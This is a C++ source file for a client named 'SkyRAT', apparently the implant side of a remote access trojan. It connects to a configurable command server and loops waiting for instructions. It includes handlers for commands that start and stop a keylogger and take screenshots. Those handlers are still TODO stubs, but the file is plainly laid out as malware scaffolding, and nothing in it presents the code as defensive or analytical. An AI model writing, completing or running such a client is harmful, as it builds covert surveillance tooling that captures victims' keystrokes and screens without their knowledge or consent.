// compile alternatives:
// g++ -std=c++11 client.cpp -o client -pthread
// g++ -std=c++11 client.cpp -o client -lws2_32

#include <iostream>
#include <thread>
#include <cstring>
#include <string>
#include <atomic>
#include <csignal>
#ifdef _WIN32
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#define INVALID_SOCKET -1
#define SOCKET_ERROR   -1
typedef int SOCKET;
#endif

// Configuration
const char* SERVER_IP   = "127.0.0.1";  // Update with server IP
const uint16_t SERVER_PORT = 4545;       // Update with server port
const int    RECV_BUF_SIZE = 1024;

// Global flag for graceful shutdown
std::atomic<bool> g_running{true};

// Signal handler for Ctrl+C
void signal_handler(int signal) {
    std::cout << "\n[Signal] Received signal " << signal << ". Shutting down gracefully..." << std::endl;
    g_running = false;
}

// Initialize networking on Windows
bool init_sockets() {
#ifdef _WIN32
    WSADATA wsaData;
    return WSAStartup(MAKEWORD(2,2), &wsaData) == 0;
#else
    return true;
#endif
}

// Cleanup networking on Windows
void cleanup_sockets() {
#ifdef _WIN32
    WSACleanup();
#endif
}

// Create and return a connected socket, or INVALID_SOCKET on error
SOCKET connect_to_server(const char* ip, uint16_t port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error: Could not create socket." << std::endl;
        return INVALID_SOCKET;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port   = htons(port);
    serverAddr.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Error: Connection failed." << std::endl;
#ifdef _WIN32
        closesocket(sock);
#else
        close(sock);
#endif
        return INVALID_SOCKET;
    }

    return sock;
}

// Send a null-terminated C-string message
bool send_message(SOCKET sock, const char* msg) {
    size_t len = std::strlen(msg);
    return send(sock, msg, static_cast<int>(len), 0) != SOCKET_ERROR;
}

// Receive into buffer, returns bytes received or -1 on error
int receive_reply(SOCKET sock, char* buffer, int bufSize) {
    int bytes = recv(sock, buffer, bufSize - 1, 0);
    if (bytes > 0) buffer[bytes] = '\0';
    return bytes;
}

// Handle different commands from server
void handle_command(const std::string& command) {
    std::cout << "[Command] Received: " << command << std::endl;
    
    if (command == "START_KEYLOGGER") {
        std::cout << "[Action] Starting keylogger module..." << std::endl;
        // TODO: Implement keylogger functionality
    }
    else if (command == "TAKE_SCREENSHOT") {
        std::cout << "[Action] Taking screenshot..." << std::endl;
        // TODO: Implement screenshot functionality
    }
    else if (command == "STOP_KEYLOGGER") {
        std::cout << "[Action] Stopping keylogger..." << std::endl;
        // TODO: Stop keylogger
    }
    else {
        std::cout << "[Action] Unknown command, echoing back: " << command << std::endl;
    }
}

// Thread worker: handles one connection lifecycle
void handle_connection() {
    if (!init_sockets()) {
        std::cerr << "Error: Socket subsystem init failed." << std::endl;
        return;
    }

    SOCKET sock = connect_to_server(SERVER_IP, SERVER_PORT);
    if (sock == INVALID_SOCKET) {
        cleanup_sockets();
        return;
    }
    std::cout << "[Thread] Connected to server on " << SERVER_IP << ":" << SERVER_PORT << std::endl;

    // Send initial greeting
    const char* greeting = "Hello from threaded client!";
    if (!send_message(sock, greeting)) {
        std::cerr << "Error: Send failed." << std::endl;
        goto cleanup;
    }
    std::cout << "[Thread] Sent greeting to server" << std::endl;

    // Keep listening for server commands
    char buffer[RECV_BUF_SIZE];
    while (g_running) {
        int received = receive_reply(sock, buffer, RECV_BUF_SIZE);
        if (received > 0) {
            std::string command(buffer);
            handle_command(command);
            
            // Send acknowledgment back to server
            std::string ack = "ACK: " + command;
            if (!send_message(sock, ack.c_str())) {
                std::cerr << "Error: Failed to send acknowledgment." << std::endl;
                break;
            }
        } else if (received == 0) {
            std::cout << "[Thread] Server closed the connection." << std::endl;
            break;
        } else {
            std::cerr << "Error: Receive failed." << std::endl;
            break;
        }
    }

cleanup:
#ifdef _WIN32
    closesocket(sock);
#else
    close(sock);
#endif

    cleanup_sockets();
    std::cout << "[Thread] Connection closed." << std::endl;
}

int main() {
    std::cout << "Starting SkyRAT threaded client..." << std::endl;
    
    // Set up signal handler for graceful shutdown
    std::signal(SIGINT, signal_handler);
    
    // Spawn connection thread
    std::thread clientThread(handle_connection);

    // Wait for client thread to finish
    clientThread.join();
    std::cout << "Client thread finished. Exiting." << std::endl;
    return 0;
}